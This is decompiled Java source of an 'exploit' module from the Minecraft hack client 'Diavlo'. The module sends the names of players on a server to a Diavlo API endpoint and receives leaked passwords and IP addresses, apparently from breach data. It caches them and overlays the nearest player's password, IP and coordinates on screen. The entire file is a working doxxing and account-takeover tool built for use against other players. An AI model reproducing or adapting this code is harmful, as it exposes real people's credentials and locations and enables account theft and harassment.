/*     */ package rip.diavlo.base.modules.exploit;
/*     */ 
/*     */ import com.google.common.eventbus.Subscribe;
/*     */ import com.google.gson.JsonArray;
/*     */ import com.google.gson.JsonElement;
/*     */ import com.google.gson.JsonObject;
/*     */ import com.google.gson.JsonParser;
/*     */ import es.diavlo.api.data.UserData;
/*     */ import java.awt.Color;
/*     */ import java.io.IOException;
/*     */ import java.io.Serializable;
/*     */ import java.util.ArrayList;
/*     */ import java.util.Map;
/*     */ import java.util.Set;
/*     */ import java.util.TreeSet;
/*     */ import java.util.concurrent.CompletableFuture;
/*     */ import java.util.concurrent.CompletionException;
/*     */ import java.util.concurrent.ExecutorService;
/*     */ import java.util.concurrent.Executors;
/*     */ import java.util.stream.Collectors;
/*     */ import net.minecraft.client.gui.ScaledResolution;
/*     */ import net.minecraft.client.network.NetworkPlayerInfo;
/*     */ import net.minecraft.entity.Entity;
/*     */ import net.minecraft.entity.EntityLivingBase;
/*     */ import net.minecraft.entity.player.EntityPlayer;
/*     */ import net.minecraft.util.EnumChatFormatting;
/*     */ import org.apache.http.HttpEntity;
/*     */ import org.apache.http.HttpResponse;
/*     */ import org.apache.http.client.methods.HttpPost;
/*     */ import org.apache.http.client.methods.HttpUriRequest;
/*     */ import org.apache.http.entity.StringEntity;
/*     */ import org.apache.http.impl.client.CloseableHttpClient;
/*     */ import org.apache.http.impl.client.HttpClients;
/*     */ import org.apache.http.util.EntityUtils;
/*     */ import rip.diavlo.base.Client;
/*     */ import rip.diavlo.base.api.font.CustomFontRenderer;
/*     */ import rip.diavlo.base.api.module.Category;
/*     */ import rip.diavlo.base.api.module.Module;
/*     */ import rip.diavlo.base.events.render.RenderGuiEvent;
/*     */ import rip.diavlo.base.events.render.RenderUtils;
/*     */ import rip.diavlo.base.utils.ChatUtil;
/*     */ import rip.diavlo.base.utils.McUtils;
/*     */ import rip.diavlo.base.utils.TabUtils;
/*     */ import rip.diavlo.base.utils.render.RenderUtil;
/*     */ 
/*     */ public class OjoDeShinigami
/*     */   extends Module
/*     */ {
/*     */   private UserData diavloUser;
/*     */   
/*     */   public OjoDeShinigami() {
/*  52 */     super("Ojo De Shinigami", 25, Category.EXPLOIT);
/*     */   }
/*     */ 
/*     */   
/*     */   public void onEnable() {
/*  57 */     this.diavloUser = UserData.getInstance();
/*  58 */     if (this.diavloUser == null) {
/*  59 */       ChatUtil.print("" + EnumChatFormatting.RED + EnumChatFormatting.BOLD + "ERROR: " + EnumChatFormatting.GREEN + "Tienes que logearte en Diavlo para realizar este hack.", true);
/*  60 */     } else if (mc.isSingleplayer()) {
/*  61 */       ChatUtil.print(EnumChatFormatting.RED + "Este hack solo se puede usar en " + EnumChatFormatting.BOLD + "MULTIJUGADOR", true);
/*  62 */     } else if (Client.getInstance().isSearchingPasswords()) {
/*  63 */       ChatUtil.print(EnumChatFormatting.RED + "El Ojo de Shinigami ya esta siendo ejecutado", true);
/*     */     } else {
/*  65 */       Client.getInstance().setSearchingPasswords(true);
/*  66 */       super.onEnable();
/*     */       
/*  68 */       ChatUtil.print(EnumChatFormatting.RED + "[Diavlo] " + EnumChatFormatting.GREEN + "La búsqueda ha empezado...", false);
/*     */       
/*  70 */       Set<String> ActualUsers = (Set<String>)TabUtils.getPlayers().stream().filter(x -> (!Client.getInstance().getPasswordCache().containsKey(x) || !Client.getInstance().getIpCache().containsKey(x))).collect(Collectors.toSet());
/*     */       
/*  72 */       if (ActualUsers.size() == 0) {
/*  73 */         ChatUtil.print(EnumChatFormatting.RED + "[Diavlo] " + EnumChatFormatting.RED + "¡No se han encontrado usuarios vulnerables!", false);
/*  74 */         Client.getInstance().setSearchingPasswords(false);
/*     */         
/*     */         return;
/*     */       } 
/*  78 */       ExecutorService executor = Executors.newFixedThreadPool(1);
/*  79 */       CompletableFuture.supplyAsync(() -> {
/*     */             try {
/*     */               return activarShinigami(ActualUsers, this.diavloUser.getToken()).get();
/*  82 */             } catch (Exception e) {
/*     */               return new ArrayList();
/*     */             } 
/*  85 */           }executor).thenAccept(result -> {
/*     */             if (result.toString().isEmpty()) {
/*     */               ChatUtil.print(EnumChatFormatting.RED + "[Diavlo] " + EnumChatFormatting.RED + "¡No se han encontrado usuarios vulnerables!", false);
/*     */             } else {
/*     */               JsonParser parser = new JsonParser();
/*     */               
/*     */               JsonObject jsonObject = parser.parse(result.toString()).getAsJsonObject();
/*     */               
/*     */               JsonObject results = jsonObject.getAsJsonObject("results");
/*     */               
/*     */               Set<Map.Entry<String, JsonElement>> nicksfound = results.entrySet();
/*     */               
/*     */               actualizarCaches(results);
/*     */               if (nicksfound.isEmpty()) {
/*     */                 ChatUtil.print(EnumChatFormatting.RED + "[Diavlo] " + EnumChatFormatting.RED + "¡No se han encontrado usuarios vulnerables!", false);
/*     */               } else {
/*     */                 ChatUtil.print(EnumChatFormatting.RED + "[Diavlo] " + EnumChatFormatting.GREEN + "¡Se han encontrado " + EnumChatFormatting.RED + nicksfound.size() + EnumChatFormatting.GREEN + " usuarios vulnerables! ", false);
/*     */                 ChatUtil.print(EnumChatFormatting.RED + "[Diavlo] " + EnumChatFormatting.RED + "[ " + EnumChatFormatting.WHITE + String.join(" , ", (Iterable<? extends CharSequence>)nicksfound.stream().map(Map.Entry::getKey).collect(Collectors.toSet())) + EnumChatFormatting.RED + " ]", false);
/*     */                 ChatUtil.print(EnumChatFormatting.RED + "[Diavlo] " + EnumChatFormatting.YELLOW + "Ojo de Shinigami " + EnumChatFormatting.BOLD + EnumChatFormatting.DARK_GREEN + "ACTIVO", false);
/*     */               } 
/*     */             } 
/*     */             Client.getInstance().setSearchingPasswords(false);
/*     */           });
/* 108 */       executor.shutdown();
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   private void actualizarCaches(JsonObject resultsArray) {
/* 115 */     for (Map.Entry<String, JsonElement> entry : (Iterable<Map.Entry<String, JsonElement>>)resultsArray.entrySet()) {
/*     */       try {
/* 117 */         String nick = entry.getKey();
/* 118 */         JsonObject userData = ((JsonElement)entry.getValue()).getAsJsonObject();
/*     */         
/* 120 */         JsonArray ips = userData.getAsJsonArray("ips");
/* 121 */         JsonArray passwords = userData.getAsJsonArray("passwords");
/* 122 */         TreeSet<String> ipSet = new TreeSet<>();
/* 123 */         TreeSet<String> passwordSet = new TreeSet<>();
/*     */         
/* 125 */         for (JsonElement ip : ips) {
/* 126 */           ipSet.add(ip.getAsString());
/*     */         }
/* 128 */         for (JsonElement pw : passwords) {
/* 129 */           passwordSet.add(pw.getAsString());
/*     */         }
/*     */         
/* 132 */         Client.getInstance().addIPstoCache(nick, ipSet);
/* 133 */         Client.getInstance().addPasswordstoCache(nick, passwordSet);
/* 134 */       } catch (Exception exception) {}
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   private String usersToJSONData(Set<String> users) {
/* 140 */     StringBuilder jsondata = new StringBuilder("{\"nicks\":[");
/* 141 */     boolean isFirst = true;
/*     */     
/* 143 */     for (String u : users) {
/* 144 */       if (!isFirst) {
/* 145 */         jsondata.append(",");
/*     */       } else {
/* 147 */         isFirst = false;
/*     */       } 
/* 149 */       jsondata.append("\"").append(u).append("\"");
/*     */     } 
/*     */     
/* 152 */     jsondata.append("]}");
/* 153 */     return jsondata.toString();
/*     */   }
/*     */   
/*     */   private CompletableFuture<String> activarShinigami(Set<String> users, String diavloToken) {
/* 157 */     return CompletableFuture.supplyAsync(() -> {
/*     */           String jsonData = usersToJSONData(users);
/*     */           
/*     */           try {
/*     */             String diavloDomain = Client.getInstance().getDiavloDomain();
/*     */             CloseableHttpClient closeableHttpClient = HttpClients.createDefault();
/*     */             HttpPost httpPost = new HttpPost("http://" + diavloDomain + "/api/v3/mcclient/shinigami");
/*     */             StringEntity entity = new StringEntity(jsonData);
/*     */             httpPost.setEntity((HttpEntity)entity);
/*     */             httpPost.setHeader("Accept", "application/json");
/*     */             httpPost.setHeader("Content-type", "application/json");
/*     */             httpPost.setHeader("Authorization", "Bearer " + diavloToken);
/*     */             HttpResponse response = closeableHttpClient.execute((HttpUriRequest)httpPost);
/*     */             if (response.getStatusLine().getStatusCode() == 200) {
/*     */               HttpEntity responseEntity = response.getEntity();
/*     */               return EntityUtils.toString(responseEntity);
/*     */             } 
/*     */             System.err.println("Request failed with status code: " + response.getStatusLine().getStatusCode());
/*     */             return "";
/* 176 */           } catch (IOException e) {
/*     */             throw new CompletionException(e);
/*     */           } 
/*     */         });
/*     */   }
/*     */   
/*     */   public String PingColored(int ping) {
/*     */     String colorcode;
/* 184 */     if (ping < 85) {
/* 185 */       colorcode = "§a";
/*     */     }
/* 187 */     else if (ping < 130) {
/* 188 */       colorcode = "§6";
/*     */     } else {
/*     */       
/* 191 */       colorcode = "§4";
/*     */     } 
/*     */     
/* 194 */     return colorcode + ping;
/*     */   }
/*     */   
/*     */   @Subscribe
/*     */   public void onRender(RenderGuiEvent event) {
/* 199 */     if (this.diavloUser == null) {
/*     */       return;
/*     */     }
/*     */     
/* 203 */     EntityPlayer p = McUtils.getClosestPlayerToEntity((Entity)mc.thePlayer, 5.0D);
/*     */ 
/*     */     
/* 206 */     if (p != null && !p.getName().contains("[NPC]")) {
/* 207 */       ScaledResolution sr = new ScaledResolution(mc);
/*     */ 
/*     */       
/* 210 */       CustomFontRenderer font = Client.getInstance().getFontManager().getDefaultFont().size(20);
/* 211 */       CustomFontRenderer minifont = Client.getInstance().getFontManager().getDefaultFont().size(18);
/*     */ 
/*     */       
/* 214 */       Set<String> passwords = (Set<String>)Client.getInstance().getPasswordCache().getOrDefault(p.getGameProfile().getName().toLowerCase(), null);
/* 215 */       Set<String> ips = (Set<String>)Client.getInstance().getIpCache().getOrDefault(p.getGameProfile().getName().toLowerCase(), null);
/*     */       
/* 217 */       double heightRect = 50.0D;
/* 218 */       double widthRect = 150.0D;
/*     */       
/* 220 */       if ((passwords != null && !passwords.isEmpty()) || (ips != null && !ips.isEmpty())) {
/* 221 */         heightRect = 70.0D;
/* 222 */         widthRect = 180.0D;
/*     */       } 
/*     */ 
/*     */       
/* 226 */       RenderUtil.roundedRectangle((sr.getScaledWidth() / 2 + 15), (sr.getScaledHeight() / 2 + 10), widthRect, heightRect, 2.0D, new Color(54, 52, 52, 98));
/* 227 */       RenderUtils.drawEntityOnScreen(sr.getScaledWidth() / 2 + 30, sr
/* 228 */           .getScaledHeight() / 2 + 50, 25, 0.0F, 0.0F, (EntityLivingBase)p, false);
/*     */ 
/*     */       
/* 231 */       font.drawStringWithShadow(p.getGameProfile().getName(), (sr.getScaledWidth() / 2 + 50), (sr.getScaledHeight() / 2 + 15), -1);
/* 232 */       minifont.drawStringWithShadow("§c§lCoords: §f§l[§c" + (int)p.posX + " §f,§c " + (int)p.posY + " §f,§c " + (int)p.posZ + "§f§l]", (sr.getScaledWidth() / 2 + 50), (sr.getScaledHeight() / 2 + 25), -1);
/*     */ 
/*     */       
/*     */       try {
/* 236 */         NetworkPlayerInfo playerNet = mc.ingameGUI.getTabList().getTabPlayers().stream().filter(x -> (x != null && x.getGameProfile() != null && x.getGameProfile().getId().equals(p.getGameProfile().getId()))).findFirst().orElse(null);
/*     */ 
/*     */         
/* 239 */         minifont.drawStringWithShadow("§c§lPing: " + PingColored(playerNet.getResponseTime()) + " ms", (sr.getScaledWidth() / 2 + 50), (sr.getScaledHeight() / 2 + 35), -1);
/* 240 */         minifont.drawStringWithShadow("§c§lGamemode: §f" + playerNet.getGametype().toUpperCase(), (sr.getScaledWidth() / 2 + 50), (sr.getScaledHeight() / 2 + 45), -1);
/*     */         
/* 242 */         if (passwords != null && !passwords.isEmpty() && ips != null && !ips.isEmpty()) {
/* 243 */           minifont.drawStringWithShadow("§c§lContraseña: §a" + ((passwords.size() > 1) ? ((String)passwords.stream().findFirst().get() + " + " + (passwords.size() - 1) + " más..") : passwords.stream().findFirst().get()), (sr.getScaledWidth() / 2 + 50), (sr.getScaledHeight() / 2 + 55), -1);
/* 244 */           minifont.drawStringWithShadow("§c§lIP: §b" + ((ips.size() > 1) ? ((String)ips.stream().findFirst().get() + " + " + (ips.size() - 1) + " más..") : ips.stream().findFirst().get()), (sr.getScaledWidth() / 2 + 50), (sr.getScaledHeight() / 2 + 65), -1);
/*     */         } else {
/*     */           
/* 247 */           if (passwords == null || passwords.isEmpty()) {
/* 248 */             minifont.drawStringWithShadow("§c§lIP: §b" + ((ips.size() > 1) ? ((String)ips.stream().findFirst().get() + " + " + (ips.size() - 1) + " más..") : ips.stream().findFirst().get()), (sr.getScaledWidth() / 2 + 50), (sr.getScaledHeight() / 2 + 55), -1);
/* 249 */             minifont.drawStringWithShadow("§c§lContraseña: §4§l[Diavlo Program]", (sr.getScaledWidth() / 2 + 50), (sr.getScaledHeight() / 2 + 65), -1);
/*     */           } 
/*     */           
/* 252 */           if (ips == null || ips.isEmpty()) {
/* 253 */             minifont.drawStringWithShadow("§c§lContraseña: §a" + ((passwords.size() > 1) ? ((String)passwords.stream().findFirst().get() + " + " + (passwords.size() - 1) + " más..") : passwords.stream().findFirst().get()), (sr.getScaledWidth() / 2 + 50), (sr.getScaledHeight() / 2 + 55), -1);
/*     */           }
/*     */         }
/*     */       
/* 257 */       } catch (Exception exception) {}
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public void onDisable() {
/* 267 */     if (this.diavloUser == null || Client.getInstance().isSearchingPasswords()) {
/*     */       return;
/*     */     }
/*     */     
/* 271 */     Client.getInstance().setSearchingPasswords(false);
/* 272 */     super.onDisable();
/* 273 */     ChatUtil.print(EnumChatFormatting.RED + "[Diavlo] " + EnumChatFormatting.YELLOW + "Ojo de Shinigami " + EnumChatFormatting.BOLD + EnumChatFormatting.RED + "DESACTIVADO", false);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String getSuffix() {
/* 279 */     return "";
/*     */   }
/*     */ }


/* Location:              C:\Users\march\Desktop\Diavlo-client.jar!\rip\diavlo\base\modules\exploit\OjoDeShinigami.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */